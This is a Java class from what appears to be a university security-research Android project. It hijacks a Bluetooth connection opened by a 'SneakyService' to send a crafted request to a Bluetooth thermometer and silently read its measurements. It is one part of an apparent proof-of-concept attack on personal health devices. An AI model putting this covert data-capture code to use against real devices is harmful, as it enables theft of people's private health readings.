package edu.illinois.seclab.extDroid.thermohack;

//import java.io.DataInput;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;


import edu.illinois.seclab.extDroid.Http.Hermes;
import edu.illinois.seclab.extDroid.Preferences.Prefs;
import edu.illinois.seclab.extDroid.bm.BodyHackThread;
import edu.illinois.seclab.extDroid.passAttack.SneakyService;

import android.bluetooth.BluetoothSocket;
import android.os.Bundle;
import android.os.Message;
//import android.os.Bundle;
//import android.os.Handler;
//import android.os.Looper;
//import android.os.Message;
import android.util.Log;

/**
 * 
 * @author soteris demetriou
 *
 */
public class ThermoHackThread extends Thread {
  private static final String TAG = "ThermoHackThread";
  public static boolean READDATA = false;
  private final BluetoothSocket mmSocket;
  private final DataInputStream mmInStream;
  private final DataOutputStream mmOutStream;
  byte[] buf = new byte[100];  // buffer store for the stream
  //Message envStatus = new Message();
  //Bundle bundle = new Bundle();

  byte[] arrayOfByte = new byte[12];
  DataHandler dataHandler;
  
  
  
  public ThermoHackThread(BluetoothSocket socket) {
  	  arrayOfByte[0] = 66;
      arrayOfByte[1] = 108;
      arrayOfByte[2] = 117;
      arrayOfByte[3] = 84;
      arrayOfByte[4] = 4;
      arrayOfByte[7] = -41;
      arrayOfByte[8] = 1;
      arrayOfByte[9] = -35;
  	
      mmSocket = socket;
      InputStream tmpIn = null;
      OutputStream tmpOut = null;

      // Get the input and output streams, using temp objects because
      // member streams are final
      try {
          tmpIn = SneakyService.socket.getInputStream();
          tmpOut = SneakyService.socket.getOutputStream();
      } catch (IOException e) { 
    	  e.printStackTrace();
    	  sendGotDataMsg();
      }

      mmInStream = new DataInputStream(tmpIn);
      mmOutStream = new DataOutputStream (tmpOut);
      dataHandler = new DataHandler();
      ThermoHackThread.READDATA = false;
  }

  public void run() {
      
     // int bytes; // bytes returned from read()
      
    //Set a listening thread
    //ListeningThread listen = new ListeningThread(mmInStream);
    //listen.start();

	  if(ThermoHackThread.READDATA){
		  Log.i(TAG, "Thread started.\n ThermoHackThread.READDATA: true \n" +
		  		"Time: " + (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME));
	  }
	  else{
		  Log.i(TAG, "Thread started.\n ThermoHackThread.READDATA: false \n" +
			  		"Time: " + (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME));
	  }


      // Keep listening to the InputStream until an exception occurs
      //while (true) {
     //while ((!ThermoHackThread.READDATA) && ( (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME  ) < Prefs.POST_WINDOW) ) {  
        Log.i(TAG, "Start TH Connect: " + (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME ));
     for(int i = 0; i < 5; i++){
      	try {
				sleep(1000);
		
  			UpdateRequest();
  			deserialize(mmInStream);
          	if(ThermoHackThread.READDATA) break;
          	//mmInStream.read(buffer); //test
              
              //Log.i(TAG, "Received data: " + buffer.toString());
              
              // Send the obtained bytes to the UI activity
              
              //MainActivity.handler.obtainMessage(MainActivity.MESSAGE_READ, bytes, -1, buffer)
                      //.sendToTarget();
          } catch (IOException e) {
              e.printStackTrace();
              //envStatus.what = EnvironmentCheck.GOTDATA;
              //sendGotDataMsg();
	    		
	    		//envStatus.setData(bundle);
              //SneakyService.handler.sendMessage(envStatus);
          } catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				//sendGotDataMsg();
			}
        }
			
     // }
      sendGotDataMsg();
  }
  
  private void UpdateRequest() throws IOException {
		// TODO Auto-generated method stub
  	arrayOfByte[7] = 76;
  	arrayOfByte[9] = 70;
  	
  	mmOutStream.write(arrayOfByte);
	}

	

	private void deserialize(DataInputStream paramDataInput) throws IOException{
  	
  		int availableBytes = paramDataInput.available();
  		byte[] arrayOfByte;
  		
//  		for(int i = 0; i < availableBytes; i++){
//  			int new_byte = paramDataInput.readUnsignedByte();
//  			Log.i(TAG, Integer.toHexString(new_byte));
//  		}
  		Log.i(TAG, "--------------------------------");
  		
  		if(paramDataInput.available() > 1){
	  		int arraySize = paramDataInput.read(buf);
	  		arrayOfByte = new byte[arraySize];
	  		for(int i = 0; i < arraySize; i++){
	  			arrayOfByte[i] = buf[i];
	  		}
	  		
	  		ThermoHackThread.READDATA = true;
	  		
	  		dataHandler.handleData(arrayOfByte);
  		}
  		
  		//sendGotDataMsg();
  		
  	
  }
	
	
  
  /**
   * Sends a GOT_DATA message to the SneakyService to close the connection
   */
  private void sendGotDataMsg() {
		// TODO Auto-generated method stub
		Message msg = new Message();
		msg.what = SneakyService.GOT_TH_DATA;
		SneakyService.sshandler.sendMessage(msg);
	}

public void readRaw(){
  		Runnable r = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					Log.i(TAG, "...");
					try {
						Log.i(TAG, "Waiting to read...");
						mmInStream.read(buf);
						Log.i(TAG, "Received data: " + buf.toString());
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
				}
			};		        
      
			r.run();
  }
  
  
  
  
  
	

	/* Call this from the main activity to send data to the remote device */
  public void write(byte[] bytes) {
      try {
          mmOutStream.write(bytes);
      } catch (IOException e) { }
  }

  /* Call this from the main activity to shutdown the connection */
  public void cancel() {
      try {
    	  SneakyService.socket.close();
      } catch (IOException e) { 
    	  Log.i(TAG, "IOException on socket close");
      }
  }
}


